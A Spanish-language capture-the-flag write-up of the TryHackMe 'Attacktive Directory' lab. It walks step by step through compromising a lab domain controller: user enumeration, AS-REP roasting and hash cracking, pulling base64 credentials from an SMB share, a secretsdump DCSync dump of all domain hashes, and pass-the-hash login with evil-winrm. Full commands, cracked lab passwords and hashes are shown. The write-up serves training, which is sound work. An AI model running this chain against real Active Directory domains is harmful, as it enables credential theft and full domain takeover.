# Resolución de la Máquina: Attacktive Directory

- **Plataforma:** TryHackMe
- **Dificultad:** Media
- **Fecha de resolución:** 07/07/2025
- **Sistema Operativo:** Windows Server

Descripción

"Attacktive Directory" es una máquina enfocada en el reconocimiento y explotación de un entorno Active Directory, diseñada para introducir al atacante en técnicas comunes de post-explotación en redes corporativas basadas en Windows.

Esta máquina simula un entorno realista con un controlador de dominio y usuarios dentro de un dominio empresarial. El objetivo principal es comprometer la red interna aprovechando vulnerabilidades comunes en servicios expuestos, abuso de configuraciones débiles y técnicas de movimiento lateral dentro de un dominio Active Directory.

Durante la resolución se exploran pasos clave como:

> Enumeración de servicios expuestos en un entorno Windows (LDAP, SMB, Kerberos, etc.)

> Enumeración de usuarios y grupos dentro del dominio utilizando herramientas como enum4linux, impacket y ldapsearch

> Ataques a protocolos de autenticación como Kerberos (AS-REP Roasting, Kerberoasting)

> Acceso inicial mediante credenciales expuestas o crackeadas, seguido por escalada de privilegios hasta obtener control total del dominio

Esta máquina es especialmente útil para:

> Comprender el funcionamiento básico de un entorno Active Directory

> Practicar ataques realistas en redes corporativas Windows

> Aprender el uso de herramientas como Impacket, BloodHound, y Evil-WinRM

> Fortalecer habilidades en post-explotación y movimiento lateral dentro de un dominio Windows

## Enumeración básica

Para ello utilizaremos enum4linux, es una herramienta de enumeración para sistemas Windows que utilizan servicios SMB (Server Message Block), comúnmente en entornos de redes corporativas o Active Directory.
Su objetivo principal es obtener información útil sin credenciales o con credenciales mínimas.

```bash
─# crackmapexec smb 10.10.26.208
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.26.208    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# enum4linux 10.10.26.208
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  7 06:44:45 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.26.208
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.26.208 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.26.208 )================================

Looking up status of 10.10.26.208
No reply from 10.10.26.208

 ===================================( Session Check on 10.10.26.208 )===================================


[+] Server 10.10.26.208 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.26.208 )================================
                                                                                                                                                                                                                                            
Domain Name: THM-AD                                                                                                                                                                                                                         
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===================================( OS information on 10.10.26.208 )===================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got OS info for 10.10.26.208 from srvinfo:                                                                                                                                                                                              
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                      


 =======================================( Users on 10.10.26.208 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.26.208 )=================================
                                                                                                                                                                                                                                            
do_connect: Connection to 10.10.26.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.26.208                                                                                                                                                                                                
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ============================( Password Policy Information for 10.10.26.208 )============================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 10.10.26.208 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.26.208)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

 =======================================( Groups on 10.10.26.208 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ==================( Users on 10.10.26.208 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                                                
                                                                                                                                                                                                                                            
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                                                              
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ===============================( Getting printer info for 10.10.26.208 )===============================
                                                                                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                     


enum4linux complete on Mon Jul  7 06:49:18 2025
```
Con la información básica del dominio procederemos a enumerar los usuarios.

```bash
└─# kerbrute userenum -d spookysec.local userlist.txt --dc 10.10.173.111 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/07/25 - Ronnie Flathers @ropnop

2025/07/07 09:38:22 >  Using KDC(s):
2025/07/07 09:38:22 >   10.10.173.111:88

2025/07/07 09:38:22 >  [+] VALID USERNAME:       james@spookysec.local
2025/07/07 09:38:23 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/07/07 09:38:24 >  [+] VALID USERNAME:       James@spookysec.local
2025/07/07 09:38:25 >  [+] VALID USERNAME:       robin@spookysec.local
2025/07/07 09:38:29 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/07/07 09:38:32 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/07/07 09:38:37 >  [+] VALID USERNAME:       backup@spookysec.local
2025/07/07 09:38:40 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/07/07 09:38:56 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/07/07 09:39:01 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/07/07 09:39:35 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/07/07 09:41:16 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/07/07 09:41:48 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/07/07 09:43:25 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/07/07 09:43:57 >  [+] VALID USERNAME:       ori@spookysec.local
2025/07/07 09:44:43 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/07/07 09:46:19 >  Done! Tested 73317 usernames (16 valid) in 476.678 seconds
```
Una vez tengamos estos enumerados los pasaremos a otra lista, la cual contendra solo los usuarios existentes en el dominio, posteriormente le haremos un password sprying

Podemos encontrar hashes de usuarios que no requieran preautenticación en Kerberos, previamente deberemos apuntar la IP al dominio en /etc/hots
```bash
─# impacket-GetNPUsers spookysec.local/ -no-pass -usersfile users.txt
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies 

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:2db974c1e914d5ae91408bd30536634f$85916b3fc6673c5dcc30b88a2b665e1b16de2f5daca9b6b4afaffd4672fccf4ad64bb3ae5441792de53b52508be7009295af9c5c9c3f1aa851b668da350fb68c78c21055c7bdc7238e74927b719ec11612a3d9242dc16ce14a3baeebf3f649e3cea1176be57d7dade1b4b4b01f1fa814e2a42a2bad55a88e267dcba086dcea733a7b289358ad0bfef1d84ff07b0d5cd8bc7138ce7ce8a9c3a6617d6e66f3e8a0a69da253f0668adc8ea21e48c18b467e555dfe4a908926f71e4f30efd69ea50344d293d3254ff157cd4a2642403979df4a688b1b8789da6545177c90bccd52067610e9edb7517a6c4b813508c7d9210e9633
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# 
```
Si buscamos en la documentación de hashcat podremos ver que es un hash "Kerberos 5, etype 23, AS-REP", modo 18200.
Procederemos a pasarlo por hashcat junto a la lista de contraseñas que se nos ha proporcionado.
```bash
└─# hashcat -m 18200 -a 0 asrep_hash.txt passwordlist.txt --force 
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-8265U CPU @ 1.60GHz, 2917/5899 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:2db974c1e914d5ae91408bd30536634f$85916b3fc6673c5dcc30b88a2b665e1b16de2f5daca9b6b4afaffd4672fccf4ad64bb3ae5441792de53b52508be7009295af9c5c9c3f1aa851b668da350fb68c78c21055c7bdc7238e74927b719ec11612a3d9242dc16ce14a3baeebf3f649e3cea1176be57d7dade1b4b4b01f1fa814e2a42a2bad55a88e267dcba086dcea733a7b289358ad0bfef1d84ff07b0d5cd8bc7138ce7ce8a9c3a6617d6e66f3e8a0a69da253f0668adc8ea21e48c18b467e555dfe4a908926f71e4f30efd69ea50344d293d3254ff157cd4a2642403979df4a688b1b8789da6545177c90bccd52067610e9edb7517a6c4b813508c7d9210e9633:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:2db974c1e91...0e9633
Time.Started.....: Tue Jul  8 05:27:02 2025, (0 secs)
Time.Estimated...: Tue Jul  8 05:27:02 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    89729 H/s (1.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7168/70188 (10.21%)
Rejected.........: 0/7168 (0.00%)
Restore.Point....: 6144/70188 (8.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: horoscope -> frida
Hardware.Mon.#1..: Util: 46%

Started: Tue Jul  8 05:26:23 2025
Stopped: Tue Jul  8 05:27:04 2025
```
Una vez crackeada la contraseña, accederemos con estas credenciales a los recursos compartid, encontraremos lo siguiente:
```bash
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# smbclient -L //10.10.187.116/backup -U 'SPOOKYSEC\\svc-admin'
Password for [svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.187.116 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# smbclient //10.10.187.116/backup -U 'SPOOKYSEC\\svc-admin' 
Password for [svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3571447 blocks available
smb: \> 
```
Haremos un get del fichero txt y decodificaremos a través de cualquier web, este esta codificado en base64.
```bash
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# ls
asrep_hash.txt  backup_credentials.txt  passwordlist.txt  sprying.sh  userlist.txt  users.txt
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
Una vez decodificado veremos lo siguiente
```
backup@spookysec.local:backup2517860
```
La cuenta backup es crucial porque tiene permisos de replicación en el controlador de dominio, lo que le permite sincronizar todos los datos del Active Directory, incluidos los hashes de contraseñas de todos los usuarios. Esto significa que, si obtenemos sus credenciales, podemos usar herramientas como secretsdump.py de Impacket para extraer estos hashes y tomar el control total del dominio.

Los hashes que la cuenta backup puede extraer están almacenados en la base de datos del Active Directory, específicamente en el archivo ntds.dit del Domain Controller. Este archivo contiene toda la información del directorio, incluidos los hashes de contraseña de todos los usuarios del dominio.

Utilizaremos el método DRSUAPI

```bash
└─# secretsdump.py SPOOKYSEC/backup:backup2517860@10.10.187.116
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250702.182415.b33e994d', 'secretsdump.py')
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:67d656493651f2d71df27724880e10bf:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8c393f57e5144b611de601e0c0cef769290db237d9e27d4e9c8840a506e961f5
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:471cd277025ad019afe673a4f3651b92
ATTACKTIVEDIREC$:des-cbc-md5:a43413911cc267b5
[*] Cleaning up...
```
Veremos que el hash NTLM del administrador es el siguiente: 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM permite conectarse usando un hash NTLM gracias a que implementa la técnica de Pass-the-Hash en el protocolo NTLM que usa WinRM. Aunque originalmente esta herramienta requería la contraseña en texto plano, ahora con el parámetro -H puede usar directamente el hash NTLM para generar la respuesta al desafío de autenticación sin necesidad de conocer la contraseña real. Esto es posible porque, en NTLM, el hash actúa como equivalente funcional de la contraseña para el proceso de challenge-response, permitiendo así autenticarse y obtener acceso remoto solo con el hash, lo que facilita la explotación y el movimiento lateral sin revelar las contraseñas en texto claro.

```bash
└─# evil-winrm -u "spookysec.local\Administrator" -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.187.116
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
